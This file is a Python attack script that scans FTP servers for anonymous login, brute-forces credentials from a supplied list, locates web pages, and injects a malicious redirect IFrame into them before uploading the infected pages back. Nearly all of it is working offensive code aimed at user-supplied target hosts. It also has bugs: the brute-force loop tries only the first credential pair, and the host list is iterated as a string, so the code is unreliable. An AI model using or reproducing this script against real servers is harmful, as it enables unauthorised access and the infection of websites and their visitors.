#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Tue May  8 23:33:39 2018

@author: starboy
"""
# Checks if anonymous login
# Bruteforce username and password if needed
# Find default web pages if ftp server hosts a web server
# Inject malicious code into those pages and upload to the server

import time
import ftplib
import optparse

# Checks if anonymous connection to the FTP server is possible
def anon_login(hostname):
    try:
        ftp = ftplib.FTP(hostname)
        ftp.login('anonymous', 'me@here.com')
        print('[+] Anonymous login successfull : '+hostname)
        ftp.quit()
        return True
    except Exception as e:
        print('[-] Anonymous Login Failed')
        return False

# Bruteforce username and password using user-paswd pair text file    
def brute_login(hostname, pass_file):
    pf = open(pass_file, 'r')
    for line in pf.readlines():
        time.sleep(1)
        username = line.split(':')[0]
        password = line.split(':')[1]
        
        try:
            ftp = ftplib.FTP(hostname)
            ftp.login(username, password)
            print('[+] Login successfull : '+hostname+' '+username+'/'+'password')
            ftp.quit()
            return (username,password)
        except Exception as e:
            pass
        
        print('[!] Could not bruteforce, password file exhausted')
        return (None,None)
    
# Returns default web page from the ftp server
def default_web_page(ftp):
    try:
        dir_list = ftp.nlst()
    except:
        dir_list = []
        print('[-] Could not list directory contents')
        print('[-] Trying next target')
        return
    
    ret_list = []
    
    for filename in dir_list:
        fn = filename.lower()
        if '.php' in fn or '.htm' in fn or '.html' in fn or '.asp' in fn:
            print('[+] Default page found: '+ filename)
            ret_list.append(filename)
    return ret_list
    
# Injects malicious IFrame on page
def inject(ftp,page,redirect):
    f = open(page+'.tmp', 'w')
    ftp.retrlines('RETR '+page, f.write)
    print('[+] Downloaded page: '+ page)
    f.write(redirect)
    f.close()
    print('[+] Injected malicious IFrame on: '+page)
    
    ftp.storlines('STOR '+page, open(page+'.tmp'))
    print('[+] Uploaded infected page: '+ page)
    
# Mounting the attack
def attack(username, password, host, redirect):
    ftp = ftplib.FTP(host)
    ftp.login(username, password)
    def_pages = default_web_page(ftp) 
    
    for page in def_pages:
        inject(ftp,page,redirect)
        

# Option parsing
parser = optparse.OptionParser('Usage:: -H <list of target host> -r <redirect page> [-f <usr/pass file>]')
parser.add_option('-H', dest='t_hosts', type='string', help='enter file name containing target hosts')
parser.add_option('-r', dest='redirect', type='string', help='enter redirection page')
parser.add_option('-f', dest='file', type='string', help='enter usr/pass file')

(options, args) = parser.parse_args()
hosts = options.t_hosts
redirect = options.redirect
pass_file = options.file

if hosts == None or redirect == None:
    print(parser.usage)
    exit(0)

for host in hosts:
    username = None
    password = None
    
    # Check if anonymous login works
    if anon_login(host) == True:
        username = 'anonymous'
        password = 'me@here.com'
        print('[+] Using anonymous credentials')
        attack(username, password, host, redirect)
        
    # Else do brute force, check if password file was provided
    elif pass_file != None:
        (username, password) = brute_login(host, pass_file)
        
    if password != None:
        print('[+] Using credentials: '+username+'/'+password)
        attack(username, password, host, redirect)



















 













        
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    